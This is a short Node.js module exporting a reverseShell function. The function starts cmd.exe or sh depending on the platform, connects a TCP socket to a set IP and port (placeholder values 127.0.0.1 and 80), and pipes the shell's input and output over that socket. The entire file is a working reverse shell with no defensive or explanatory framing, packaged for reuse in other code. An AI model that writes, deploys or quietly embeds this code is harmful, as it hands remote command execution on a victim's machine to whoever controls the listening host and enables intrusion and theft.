const os = require('os');
const net = require('net');
const { exec } = require('child_process');

let IP = "127.0.0.1";
let PORT = 80;

function reverseShell() {
    let shellCommand;
    switch (os.platform()) {
        case 'win32':
            shellCommand = "cmd.exe";
            break;
        case 'darwin':
        case 'linux':
            shellCommand = "sh";
            break;
        default:
            return;
    }

    let shell = exec(shellCommand);

    let client_sock = new net.Socket();
    client_sock.connect(PORT, IP, () => {
        client_sock.pipe(shell.stdin);
        shell.stdout.pipe(client_sock);
        shell.stderr.pipe(client_sock);
    });
}

module.exports = reverseShell
